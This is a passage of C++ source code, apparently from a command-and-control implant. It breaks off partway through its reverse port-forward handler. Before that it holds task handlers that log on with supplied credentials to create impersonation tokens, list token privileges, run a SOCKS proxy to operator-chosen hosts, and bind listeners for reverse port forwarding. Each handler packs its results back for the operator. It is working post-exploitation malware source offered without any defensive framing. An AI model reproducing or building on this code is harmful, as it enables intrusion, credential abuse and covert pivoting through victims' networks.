            if ( ! Self->Advapi32.LogonUserA( 
                UserName, 
                DomainName && DomainName[0] ? DomainName : nullptr, 
                Password, 
                LOGON32_LOGON_INTERACTIVE, 
                LOGON32_PROVIDER_DEFAULT, 
                &TokenHandle
            ) ) {
                DWORD Error = KhGetError;
                
                if ( !Self->Advapi32.LogonUserA( 
                    UserName, 
                    DomainName && DomainName[0] ? DomainName : nullptr, 
                    Password, 
                    LOGON32_LOGON_NETWORK, 
                    LOGON32_PROVIDER_DEFAULT, 
                    &TokenHandle
                ) ) {
                    Self->Pkg->Int32( Package, FALSE );
                    break;
                }
            }

            if ( !TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
                KhDbg("[-] Invalid token handle");
                Self->Pkg->Int32( Package, FALSE );
                break;
            }

            TOKEN_NODE* NewToken = Self->Tkn->Add( TokenHandle, Self->Session.ProcessID );
            
            if ( NewToken ) {
                Self->Pkg->Int32( Package, TRUE );
                Self->Pkg->Int32( Package, NewToken->TokenID );
                Self->Pkg->Int32( Package, NewToken->ProcessID );
                Self->Pkg->Str( Package, NewToken->User ? NewToken->User : (CHAR*)"" );
                Self->Pkg->Str( Package, NewToken->Host ? NewToken->Host : (CHAR*)"" );
                
                Self->Pkg->Int64( Package, (INT64)NewToken->Handle );
            } else {
                Self->Ntdll.NtClose( TokenHandle );
                Self->Pkg->Int32( Package, FALSE );
            }

            break;
        }
        case Action::Token::GetPriv: {            
            HANDLE TokenHandle = Self->Tkn->CurrentPs();
            
            if ( !TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
                Self->Pkg->Int32( Package, FALSE );
                break;
            }

            BOOL Result = Self->Tkn->GetPrivs( TokenHandle );
            
            Self->Pkg->Int32( Package, Result );
            
            Self->Ntdll.NtClose( TokenHandle );

            break;
        }
        case Action::Token::LsPriv: {
            ULONG       PrivListLen = 0;
            PRIV_LIST** PrivList    = nullptr;
            HANDLE      TokenHandle = Self->Tkn->CurrentPs();

            if ( ! TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
                Self->Pkg->Int32( Package, 0 );
                break;
            }

            PrivList = (PRIV_LIST**)Self->Tkn->ListPrivs( TokenHandle, PrivListLen );
            Self->Pkg->Int32( Package, PrivListLen );

            if ( PrivList ) {
                for ( ULONG i = 0; i < PrivListLen; i++ ) {
                    if ( ! PrivList[i] ) {
                        continue;
                    }
                    
                    Self->Pkg->Str(   Package, PrivList[i]->PrivName   );
                    Self->Pkg->Int32( Package, PrivList[i]->Attributes );
                    
                    if ( PrivList[i]->PrivName ) {
                        KhFree( PrivList[i]->PrivName );
                    }

                    KhFree( PrivList[i] );
                }

                KhFree( PrivList );
            }

            Self->Ntdll.NtClose( TokenHandle );

            break;
        }
        default: {
            KhSetError( ERROR_INVALID_PARAMETER );
            break;
        }
    }

    return KhRetSuccess;
}

auto DECLFN Task::ProcessTunnel(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;

    COMMAND_TUNNEL_ACCEPT_EVENT    AcceptEvents[30] = { 0 };
    COMMAND_TUNNEL_START_TCP_EVENT Events[90]       = { 0 };
    COMMAND_TUNNEL_WRITE_TCP_EVENT WriteEvents[30]  = { 0 };

    ULONG WriteEvtLen = 0;
    ULONG AcceptLen   = 0;
    ULONG StartEvtLen = 0;

    INT8  Index    = -1;
    for ( INT i = 0; i < 30; i++ ) {
        if ( ! Self->Tsp->Tunnels[i].ChannelID || Self->Tsp->Tunnels[i].ChannelID == 0 ) {
            Index = i; break;
        }
    }

	timeval Timeout = { 0, 100 };

	for ( INT i = 0; i < 30; i++ ) {
        if ( Self->Tsp->Tunnels[i].State == TUNNEL_STATE_CONNECT ) {
            ULONG  ChannelId = Self->Tsp->Tunnels[i].ChannelID;
            fd_set Readfds;

            Readfds.fd_count = 1;
            Readfds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;

            fd_set Exceptfds;

            Exceptfds.fd_count = 1;
            Exceptfds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;

            fd_set Writefds;

            Writefds.fd_count    = 1;
            Writefds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;

            Self->Ws2_32.select( 0, &Readfds, &Writefds, &Exceptfds, &Timeout );

            if ( Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_REVERSE_TCP ) {
                if ( Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &Readfds ) ) {

                    SOCKET SocketObj = Self->Ws2_32.accept( Self->Tsp->Tunnels[i].Socket, 0, 0 );
                    ULONG  Mode      = 1;

                    if ( Self->Ws2_32.ioctlsocket( SocketObj, FIONBIO, &Mode ) == -1 ) {
                        Self->Ws2_32.closesocket( SocketObj );
                        continue;
                    }
    
                    ULONG cid = Self->Krnl32.GetTickCount();
                    cid = Self->Ntdll.RtlRandomEx(&cid);
                    cid = cid % ULONG_MAX;
    
                    KhDbg("cid: %lu", cid);
                    
                    if ( Index != -1 ) {
                        Self->Tsp->Tunnels[Index].ChannelID = cid;
                        Self->Tsp->Tunnels[Index].Port      = 0;
                        Self->Tsp->Tunnels[Index].Host      = nullptr;
                        Self->Tsp->Tunnels[Index].Username  = nullptr;
                        Self->Tsp->Tunnels[Index].Password  = nullptr; 
                        Self->Tsp->Tunnels[Index].Socket    = SocketObj;  
                        Self->Tsp->Tunnels[Index].State     = TUNNEL_STATE_READY;
                        Self->Tsp->Tunnels[Index].Mode      = TUNNEL_MODE_SEND_TCP;                     
                        Self->Tsp->Tunnels[Index].WaitTime  = 180000;                     
                        Self->Tsp->Tunnels[Index].StartTick = Self->Krnl32.GetTickCount();
                        Self->Tsp->TunnelTasksCount++;
                    }
                    
                    if ( AcceptLen < 30 ) {
                        AcceptEvents[AcceptLen].TunnelID  = Self->Tsp->Tunnels[i].ChannelID;
                        AcceptEvents[AcceptLen].SubCmd    = COMMAND_TUNNEL_ACCEPT;
                        AcceptEvents[AcceptLen].ChannelID = cid;
                        AcceptLen++;
                    }
                }
            } else {
                if ( Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_SEND_TCP ) {
                    if ( Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &Exceptfds ) ) {
                        Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;

                        ULONG Result = 0;
    
                        if ( StartEvtLen < 90 ) {
                            Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                            Events[StartEvtLen].SubCmd = COMMAND_TUNNEL_START_TCP;
                            Events[StartEvtLen].Result = Result;
                            StartEvtLen++;
                        }
    
                        continue;
                    }

                    if ( Self->Ws2_32.__WSAFDIsSet( Self->Tsp->Tunnels[i].Socket, &Writefds ) ) {
                        Self->Tsp->Tunnels[i].State = TUNNEL_STATE_READY;
                        ULONG Result = 1;
    
                        if ( StartEvtLen < 90 ) {
                            Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                            Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
                            Events[StartEvtLen].Result    = Result;
                            StartEvtLen++;
                        }
                        continue;
                    }
                    if ( Self->Ws2_32.__WSAFDIsSet( Self->Tsp->Tunnels[i].Socket, &Readfds ) ) {
                        
                        SOCKET TmpSocketObj = Self->Ws2_32.accept( Self->Tsp->Tunnels[i].Socket, 0, 0 );
                        Self->Tsp->Tunnels[i].Socket = TmpSocketObj;
                        if ( TmpSocketObj == -1 ) {
                            Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;
                            
                            ULONG Result = 0;

                            if ( StartEvtLen < 90 ) {
                                Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                                Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
                                Events[StartEvtLen].Result    = Result;
                                StartEvtLen++;
                            }
                        }
                        else {
                            Self->Tsp->Tunnels[i].State = TUNNEL_STATE_READY;

                            ULONG Result = 1;
    
                            if ( StartEvtLen < 90 ) {
                                Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                                Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
                                Events[StartEvtLen].Result    = Result;
                                StartEvtLen++;
                            }
    
                        }

                        Self->Ws2_32.closesocket(Self->Tsp->Tunnels[i].Socket);
                        continue;
                    }
                }
                
                if ( Self->Krnl32.GetTickCount() - Self->Tsp->Tunnels[i].StartTick > Self->Tsp->Tunnels[i].WaitTime ) {
    
                    Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;

                    ULONG Result = 0;
    
                    if (StartEvtLen < 90) {
                        Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                        Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
                        Events[StartEvtLen].Result    = Result;
                        StartEvtLen++;
                    }
                }
            }
        }
    }

	ULONG finishTick = Self->Krnl32.GetTickCount() + 2500;

    while ( Self->Krnl32.GetTickCount() < finishTick ) {
        ULONG iterCount = 0;
        KhDbg("In Recv");
        for ( INT i = 0; i < 30; i++ ) {
            if ( Self->Tsp->Tunnels[i].State != TUNNEL_STATE_READY ) continue;

            ULONG DataLength = 0;
            int rc = Self->Ws2_32.ioctlsocket( Self->Tsp->Tunnels[i].Socket, FIONREAD, &DataLength );
            if ( DataLength > 0xFFFFC ) DataLength = 0xFFFFC;

            if ( rc == -1 ) {
                Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;

                ULONG Result = 0;

                if ( StartEvtLen < 90 ) {
                    Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                    Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
                    Events[StartEvtLen].Result    = Result;
                    StartEvtLen++;
                }
            } else {
                KhDbg("rc != -1, DataLength=%lu on Tunnel %d", DataLength, Self->Tsp->Tunnels[i].ChannelID);
                if ( DataLength ) {
                    
                    PBYTE Buffer = (PBYTE)KhAlloc( DataLength );
                    if ( ! Buffer ) continue;
                    
                    BYTE* BufferBase = Buffer; // Keep original pointer for freeing and accessing data
                    
                    DWORD RecvSize   = 0;
                    ULONG dwReaded   = 0;
                    BOOL  Continuer  = true;
                    BOOL  Continuer2 = true;
                    ULONG readed     = -1;

                    if ( DataLength <= 0 ) {
                        Continuer = FALSE; readed = 0;
                    }

                    if ( Continuer ) {
                        KhDbg("Starting recv loop for Tunnel %d", Self->Tsp->Tunnels[i].ChannelID);
                        while ( 1 ) {
                            RecvSize = Self->Ws2_32.recv(Self->Tsp->Tunnels[i].Socket, (PCHAR)( Buffer + dwReaded ), DataLength - dwReaded, 0);
                            if ( RecvSize == 0 || RecvSize == -1 ) break;
    
                            dwReaded += RecvSize;
    
                            if ( (int)dwReaded >= DataLength ) {
                                Continuer2 = FALSE; readed = dwReaded;
                                break;
                            }
                        }

                        if( Continuer2 ){
                            Self->Ws2_32.shutdown( Self->Tsp->Tunnels[i].Socket, 2 );
                            Self->Ws2_32.closesocket( Self->Tsp->Tunnels[i].Socket );
                            readed = -1;
                        }
                    }

                    KhDbg("Finished recv loop for Tunnel %d, readed=%lu", Self->Tsp->Tunnels[i].ChannelID, readed);

                    if ( readed == (ULONG)-1 ) {
                        Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;

                        ULONG Result = 0;

                        if ( StartEvtLen < 90 ) {
                            Events[StartEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                            Events[StartEvtLen].SubCmd    = COMMAND_TUNNEL_START_TCP;
                            Events[StartEvtLen].Result    = Result;
                            StartEvtLen++;
                        }

                        KhFree( BufferBase );
                    } else if ( readed ) {
                        KhDbg("readed %lu bytes from Tunnel %d, Adding to COMMAND_TUNNEL_WRITE_TCP", readed, Self->Tsp->Tunnels[i].ChannelID);

                        if ( WriteEvtLen < 90 ) {
                            WriteEvents[WriteEvtLen].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                            WriteEvents[WriteEvtLen].SubCmd    = COMMAND_TUNNEL_WRITE_TCP;
                            WriteEvents[WriteEvtLen].Data      = BufferBase;
                            WriteEvents[WriteEvtLen].DataLen   = readed;
                            WriteEvtLen++;
                        }

                        iterCount += 1;
                    } else {
                        KhFree( BufferBase );
                    }
                }
            }
            
        } // for tunnels

        if ( iterCount == 0 ) break;
    }
    
    Self->Pkg->Int32( Package, AcceptLen );

    for (ULONG i = 0; i < AcceptLen; i++) {
        KhDbg("Packing event %d: TunnelID=%lu, SubCmd=%lu, ChannelID=%lu", 
            i, AcceptEvents[i].TunnelID, AcceptEvents[i].SubCmd, AcceptEvents[i].ChannelID);
        
        Self->Pkg->Int32( Package, AcceptEvents[i].TunnelID );
        Self->Pkg->Int32( Package, AcceptEvents[i].SubCmd );
        Self->Pkg->Int32( Package, AcceptEvents[i].ChannelID );
    }

    KhDbg("Packing %d tunnel events", StartEvtLen);
    
    Self->Pkg->Int32( Package, StartEvtLen );

    for (ULONG i = 0; i < StartEvtLen; i++) {
        KhDbg("Packing event %d: ChannelID=%lu, SubCmd=%lu, Result=%lu", 
            i, Events[i].ChannelID, Events[i].SubCmd, Events[i].Result);
        
        Self->Pkg->Int32( Package, Events[i].ChannelID );
        Self->Pkg->Int32( Package, Events[i].SubCmd );
        Self->Pkg->Int32( Package, Events[i].Result );
    }

    KhDbg("Packing %d tunnel Write events", WriteEvtLen);
    
    Self->Pkg->Int32( Package, WriteEvtLen );

    for ( ULONG i = 0; i < WriteEvtLen; i++ ) {
        KhDbg("Packing event %d: ChannelID=%lu, SubCmd=%lu, DataLen=%lu", i, WriteEvents[i].ChannelID, WriteEvents[i].SubCmd, WriteEvents[i].DataLen);
        
        Self->Pkg->Int32( Package, WriteEvents[i].ChannelID );
        Self->Pkg->Int32( Package, WriteEvents[i].SubCmd );
        Self->Pkg->Bytes( Package, WriteEvents[i].Data, WriteEvents[i].DataLen );
        Self->Pkg->Int32( Package, WriteEvents[i].DataLen );
    }

    for ( ULONG i = 0; i < WriteEvtLen; i++ ) {
        if ( WriteEvents[i].Data ) {
            KhFree( WriteEvents[i].Data );
        }
    }
 
    for ( INT i = 0; i < 30; i++ ) {
        if ( Self->Tsp->Tunnels[i].State == TUNNEL_STATE_CLOSE && Self->Tsp->Tunnels[i].ChannelID != 0 ) {
			
			if (Self->Tsp->Tunnels[i].CloseTimer == 0) {
				Self->Tsp->Tunnels[i].CloseTimer = Self->Krnl32.GetTickCount();
				continue;
			}

			if ( Self->Tsp->Tunnels[i].CloseTimer + 1000 < Self->Krnl32.GetTickCount() ) {
				if ( Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_SEND_TCP || Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_SEND_UDP )
					Self->Ws2_32.shutdown(Self->Tsp->Tunnels[i].Socket, 2);
				
				if ( Self->Ws2_32.closesocket( Self->Tsp->Tunnels[i].Socket ) && Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_REVERSE_TCP ) {
					continue;
                }

                KhDbg("Closing Tunnel %d, TunnelTasksCount: %d", Self->Tsp->Tunnels[i].ChannelID, Self->Tsp->TunnelTasksCount);

				// Free allocated strings before resetting the tunnel
				if (Self->Tsp->Tunnels[i].Host && Self->Hp->CheckPtr(Self->Tsp->Tunnels[i].Host)) {
					KhDbg("Freeing Host pointer");
					KhFree(Self->Tsp->Tunnels[i].Host);
					Self->Tsp->Tunnels[i].Host = nullptr;
				}
				if (Self->Tsp->Tunnels[i].Username && Self->Hp->CheckPtr(Self->Tsp->Tunnels[i].Username)) {
					KhFree(Self->Tsp->Tunnels[i].Username);
					Self->Tsp->Tunnels[i].Username = nullptr;
				}
				if (Self->Tsp->Tunnels[i].Password && Self->Hp->CheckPtr(Self->Tsp->Tunnels[i].Password)) {
					KhFree(Self->Tsp->Tunnels[i].Password);
					Self->Tsp->Tunnels[i].Password = nullptr;
				}

				Self->Tsp->Tunnels[i].ChannelID  = 0;
                Self->Tsp->Tunnels[i].State      = 0;
                Self->Tsp->Tunnels[i].CloseTimer = 0;
                Self->Tsp->TunnelTasksCount     -= 1;
                KhDbg("TunnelTasksCount: %d", Self->Tsp->TunnelTasksCount);
			}
		}
    }

    if ( Self->Tsp->TunnelTasksCount == 0 ){
        Job->Clean = TRUE;
        return KhRetSuccess;
    }

    Job->Clean = FALSE;
    return KhRetSuccess;
}

auto DECLFN Task::Socks(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package     = Job->Pkg;
    PARSER*  Parser      = Job->Psr;

    ULONG DecisionFlag = Self->Psr->Int32( Parser );
    KhDbg( "start flag: %d", DecisionFlag );

    INT8 Index = -1;

    switch ( DecisionFlag ) {
        case KH_SOCKET_NEW: {
            CHAR* Protocol  = Self->Psr->Str( Parser, 0 );
            ULONG ChannelID = Self->Psr->Int32( Parser );
            CHAR* Address   = Self->Psr->Str( Parser, 0 );
            ULONG Port      = Self->Psr->Int32( Parser );

            KhDbg( "protocol: %s", Protocol );
            KhDbg( "channelID: %lu", ChannelID );
            KhDbg( "address: %s", Address );
            KhDbg( "port: %d", Port );

            for ( INT i = 0; i < 30; i++ ) {
                if ( ! Self->Tsp->Tunnels[i].ChannelID || Self->Tsp->Tunnels[i].ChannelID == 0 ) {
                    Index = i; break;
                }
            }

            if ( Index == -1 ) {
                CHAR* ErrorMsg = "Maximum concurrent Tunnels (30) reached";
                KhDbg("%s", ErrorMsg); QuickErr( ErrorMsg );
                return KhRetSuccess;
            }

            KhDbg("index: %d", Index);

            // Defensive: ensure any old allocations from this slot are freed before reuse
            if (Self->Tsp->Tunnels[Index].Host && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Host)) {
                KhFree(Self->Tsp->Tunnels[Index].Host);
                Self->Tsp->Tunnels[Index].Host = nullptr;
            }
            if (Self->Tsp->Tunnels[Index].Username && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Username)) {
                KhFree(Self->Tsp->Tunnels[Index].Username);
                Self->Tsp->Tunnels[Index].Username = nullptr;
            }
            if (Self->Tsp->Tunnels[Index].Password && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Password)) {
                KhFree(Self->Tsp->Tunnels[Index].Password);
                Self->Tsp->Tunnels[Index].Password = nullptr;
            }

            WSAData WsaData;
            if ( Self->Ws2_32.WSAStartup( 514, &WsaData ) ) {
                Self->Ws2_32.WSACleanup();
                QuickErr( "Unable To Initialize Winsock Library" );
                return KhRetSuccess;
            }

            SOCKET SocketObj = Self->Ws2_32.socket( AF_INET, SOCK_STREAM, 0 );
            if ( SocketObj != INVALID_SOCKET ) {
                hostent* Host = Self->Ws2_32.gethostbyname( Address );
                if ( Host ) {
                    ULONG       Mode       = 1;
                    sockaddr_in SocketAddr = { 0 };

                    Mem::Copy((PVOID)&SocketAddr.sin_addr, (PVOID)(*(const void**)Host->h_addr_list), Host->h_length);

                    SocketAddr.sin_family = AF_INET;
                    SocketAddr.sin_port = Self->Ws2_32.htons( Port );
                    
                    if ( Self->Ws2_32.ioctlsocket( SocketObj, FIONBIO, &Mode ) != -1 ) {
                        if ( ! ( Self->Ws2_32.connect( SocketObj, (sockaddr*)&SocketAddr, sizeof( sockaddr ) ) == -1 && Self->Ws2_32.WSAGetLastError() != WSAEWOULDBLOCK ) ) {
                            KhDbg("Socket connected successfully: %s:%d", Address, Port);

                            INT32 Mode = 0;

                            ULONG AddrLen = Str::LengthA(Address);
                            CHAR* HostCopy = (CHAR*)KhAlloc(AddrLen + 1);
                            if (HostCopy) {
                                Mem::Copy(HostCopy, Address, AddrLen);
                                HostCopy[AddrLen] = '\0';
                            }

                            Self->Tsp->Tunnels[Index].ChannelID = ChannelID;
                            Self->Tsp->Tunnels[Index].Host      = HostCopy;
                            Self->Tsp->Tunnels[Index].Port      = Port;
                            Self->Tsp->Tunnels[Index].Username  = nullptr;
                            Self->Tsp->Tunnels[Index].Password  = nullptr; 
                            Self->Tsp->Tunnels[Index].Socket    = SocketObj;  
                            Self->Tsp->Tunnels[Index].State     = TUNNEL_STATE_CONNECT;
                            Self->Tsp->Tunnels[Index].Mode      = TUNNEL_MODE_SEND_TCP;                     
                            Self->Tsp->Tunnels[Index].WaitTime  = 30000;                     
                            Self->Tsp->Tunnels[Index].StartTick = Self->Krnl32.GetTickCount();                     

                            KhDbg("TunnelTasksCount: %d", Self->Tsp->TunnelTasksCount);
                            
                            Self->Tsp->TunnelTasksCount++;

                            KhDbg("TunnelTasksCount: %d", Self->Tsp->TunnelTasksCount);
                            if( Self->Tsp->TunnelTasksCount == 1 ){
                                KhDbg("Adding Process Tunnel job");

                                PARSER* TmpPsrDownload = nullptr;
                                PBYTE   TmpBufDownload = (BYTE*)KhAlloc( sizeof(UINT16) );
                                UINT16  CmdDownload    = (UINT16)Action::Task::ProcessTunnels;
                                JOBS*   NewJobDownload = nullptr;

                                // 4-byte big-endian length
                                TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
                                TmpBufDownload[1] = (CmdDownload >> 8) & 0xFF;

                                TmpPsrDownload = (PARSER*)KhAlloc( sizeof(PARSER) );
                                if ( ! TmpPsrDownload ) {         
                                    KhDbg("ERROR: Failed to create TmpParser");
                                    return KhGetError;
                                }
                            
                                // Initialize parser (Parser::New makes an internal copy)
                                Self->Psr->New( TmpPsrDownload, TmpBufDownload, sizeof(UINT16) );

                                KhFree( TmpBufDownload );
                            
                                // Now create the job — IsResponse = FALSE so Jobs::Create will call Bytes() on TmpPsr
                                NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, TRUE );
                                if ( ! NewJobDownload ) {
                                    KhDbg("WARNING: Failed to create job for Process Tunnel task");
                                    KhFree(TmpBufDownload);
                                    return KhGetError;
                                }
                            }

                            return KhRetSuccess;
                            
                        }
                    }
                }
            }

            Self->Ws2_32.closesocket( SocketObj );
            
            ULONG Result = 0;
            Self->Pkg->Int64( Package, ChannelID );
            Self->Pkg->Int64( Package, COMMAND_TUNNEL_START_TCP );
            Self->Pkg->Int16( Package, Result );
        }
        case KH_SOCKET_DATA: {
            CHAR* Protocol  = Self->Psr->Str( Parser, 0 );
            ULONG ChannelID = Self->Psr->Int32( Parser );
            ULONG ChunkSize = Self->Psr->Int32( Parser );
            BYTE* ChunkData = Self->Psr->Bytes( Parser, 0 );

            KhDbg( "Protocol:   %s ", Protocol );
            KhDbg( "Channel ID: %lu", ChannelID );
            KhDbg( "Chunk Size: %d ", ChunkSize );

            //// debug chunk data

            // KhDbg( "Chunk Bytes on SOCKS WRITE channelID: %lu, Length: %d", channelID, ChunkSize );
            // for ( UINT64 i = 0; i < ChunkSize; i++ ) {
            //     KhDbg( "%02X ", ChunkData[i] );
            // }
            // KhDbg( "Done Printing\n" );

            INT ChannelIndex = -1;
            for ( INT i = 0; i < 30; i++ ) {
                if ( 
                    Self->Tsp->Tunnels[i].ChannelID && Self->Tsp->Tunnels[i].ChannelID == ChannelID
                ) { ChannelIndex = i; break; }
            }

            if ( ChannelIndex == -1 ) {
                QuickErr( "Channel ID not found" );
                return KhRetSuccess;
            }

            KhDbg("ChannelIndex: %lu", ChannelIndex);

            DWORD   FinishTick = Self->Krnl32.GetTickCount() + 30000;
			timeval Timeout    = { 0, 100 };
			fd_set  Exceptfds  = { 0 };
			fd_set  Writefds   = { 0 };
			
			while ( Self->Krnl32.GetTickCount() < FinishTick ) {
				Writefds.fd_array[0]  = Self->Tsp->Tunnels[ChannelIndex].Socket;
				Writefds.fd_count     = 1;
				Exceptfds.fd_array[0] = Writefds.fd_array[0];
				Exceptfds.fd_count    = 1;

				Self->Ws2_32.select( 0, 0, &Writefds, &Exceptfds, &Timeout );

				if ( Self->Ws2_32.__WSAFDIsSet( Self->Tsp->Tunnels[ChannelIndex].Socket, &Exceptfds ) ) break;

				if ( Self->Ws2_32.__WSAFDIsSet( Self->Tsp->Tunnels[ChannelIndex].Socket, &Writefds ) ) {
					
                    if ( Self->Ws2_32.send(Self->Tsp->Tunnels[ChannelIndex].Socket, (CHAR*)ChunkData, ChunkSize, 0) != -1 || Self->Ws2_32.WSAGetLastError() != WSAEWOULDBLOCK ){
                        return KhRetSuccess;
                    }

					Self->Krnl32.Sleep(1000);
				}
			}
			break;

        }
        case KH_SOCKET_CLOSE:{
            ULONG ChannelID = Self->Psr->Int32( Parser );
            KhDbg( "Delete and close Channel ID: %lu", ChannelID );

            for (INT i = 0; i < 30; i++) {
                if ( Self->Tsp->Tunnels[i].ChannelID == ChannelID && Self->Tsp->Tunnels[i].State != TUNNEL_STATE_CLOSE ) {
                    Self->Tsp->Tunnels[i].State = TUNNEL_STATE_CLOSE;
                    break;
                }
            }
        }
    }

    return KhRetSuccess;
}

auto Task::RPortfwd(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    INT8  Index     = -1;
    ULONG ChannelID = Self->Psr->Int32( Parser );
    ULONG Port      = Self->Psr->Int32( Parser );

    KhDbg( "Channel ID: %lu", ChannelID );
    KhDbg( "Port: %d", Port );

    for ( INT i = 0; i < 30; i++ ) {
        if ( ! Self->Tsp->Tunnels[i].ChannelID || Self->Tsp->Tunnels[i].ChannelID == 0 ) {
		    if ( ! ( Self->Tsp->Tunnels[i].Mode == TUNNEL_MODE_REVERSE_TCP && Self->Tsp->Tunnels[i].Port == Port && Self->Tsp->Tunnels[i].State != TUNNEL_STATE_CLOSE ) ) {
                Index = i; break;
            }
        }
    }

    if ( Index == -1 ) {
        QuickErr( "Maximum concurrent Tunnels (30) reached or Tunnel already exists" );
        return KhRetSuccess;
    }

    KhDbg("index: %d", Index);

    // Defensive: ensure any old allocations from this slot are freed before reuse
    if (Self->Tsp->Tunnels[Index].Host && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Host)) {
        KhFree(Self->Tsp->Tunnels[Index].Host);
        Self->Tsp->Tunnels[Index].Host = nullptr;
    }
    if (Self->Tsp->Tunnels[Index].Username && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Username)) {
        KhFree(Self->Tsp->Tunnels[Index].Username);
        Self->Tsp->Tunnels[Index].Username = nullptr;
    }
    if (Self->Tsp->Tunnels[Index].Password && Self->Hp->CheckPtr(Self->Tsp->Tunnels[Index].Password)) {
        KhFree(Self->Tsp->Tunnels[Index].Password);
        Self->Tsp->Tunnels[Index].Password = nullptr;
    }

    WSAData WsaData;
    if ( Self->Ws2_32.WSAStartup( 514, &WsaData ) ) {
        Self->Ws2_32.WSACleanup();
        QuickErr( "Unable To Initialize Winsock Library" );
        return KhRetSuccess;
    }

    SOCKET SocketObj = Self->Ws2_32.socket( AF_INET, SOCK_STREAM, 0 );
    if ( SocketObj != INVALID_SOCKET ) {
        sockaddr_in SocketAddr = { 0 };
        SocketAddr.sin_family = AF_INET;
        SocketAddr.sin_port   = Self->Ws2_32.htons( Port );
        
        ULONG Mode = 1;
        if ( Self->Ws2_32.ioctlsocket( SocketObj, FIONBIO, &Mode ) != -1) {
            if ( Self->Ws2_32.bind( SocketObj, (sockaddr*)&SocketAddr, sizeof( SocketAddr ) ) != -1 ) {
                KhDbg("Socket binded successfully: %d", Port);
                if ( Self->Ws2_32.listen( SocketObj, 10 ) != -1 ){
                    KhDbg("Socket listened successfully: %d", Port);
                        
                    Self->Tsp->Tunnels[Index].ChannelID = ChannelID;
                    Self->Tsp->Tunnels[Index].Port      = Port;
                    Self->Tsp->Tunnels[Index].Host      = nullptr;
                    Self->Tsp->Tunnels[Index].Username  = nullptr;
                    Self->Tsp->Tunnels[Index].Password  = nullptr; 
                    Self->Tsp->Tunnels[Index].Socket    = SocketObj;  
                    Self->Tsp->Tunnels[Index].State     = TUNNEL_STATE_CONNECT;
                    Self->Tsp->Tunnels[Index].Mode      = TUNNEL_MODE_REVERSE_TCP;                     
                    Self->Tsp->Tunnels[Index].WaitTime  = 0;                     
                    Self->Tsp->Tunnels[Index].StartTick = Self->Krnl32.GetTickCount();                     

                    KhDbg("TunnelTasksCount: %d", Self->Tsp->TunnelTasksCount);

                    Self->Tsp->TunnelTasksCount++;

                    KhDbg("added ++\n");

                    if( Self->Tsp->TunnelTasksCount == 1 ){
                        KhDbg("Adding Process Tunnel job\n");
                        PARSER* TmpPsrDownload = nullptr;
                        PBYTE   TmpBufDownload = (BYTE*)KhAlloc( sizeof(UINT16) );
                        UINT16  CmdDownload    = (UINT16)Action::Task::ProcessTunnels;
                        JOBS*   NewJobDownload = nullptr;
                        // 4-byte big-endian length
                        TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
                        TmpBufDownload[1] = (CmdDownload >> 8) & 0xFF;

                        TmpPsrDownload = (PARSER*)KhAlloc( sizeof(PARSER) );
                        if ( ! TmpPsrDownload ) {         
                            KhDbg("ERROR: Failed to create TmpParser");
                            return KhGetError;
                        }
                    
                        // Initialize parser (Parser::New makes an internal copy)
                        Self->Psr->New( TmpPsrDownload, TmpBufDownload, sizeof(UINT16) );

                        KhFree( TmpBufDownload );
                    
                        // Now create the job — IsResponse = FALSE so Jobs::Create will call Bytes() on TmpPsr
                        NewJobDownload = Self->Jbs->Create( Self->Jbs->TunnelUUID, TmpPsrDownload, TRUE );
                        if ( ! NewJobDownload ) {
                            KhDbg("WARNING: Failed to create job for Process Tunnel task\n");
                            KhFree(TmpBufDownload);
                            return KhGetError;
                        }
                    }
                
                    ULONG Result = 1;
                    Self->Pkg->Int64( Package, ChannelID );
                    Self->Pkg->Int64( Package, COMMAND_TUNNEL_REVERSE );
                    Self->Pkg->Int16( Package, Result );
                    return KhRetSuccess;
                }    
            }
        }
    }

    Self->Ws2_32.closesocket( SocketObj );
    
    ULONG result = 0;
    Self->Pkg->Int64( Package, ChannelID );
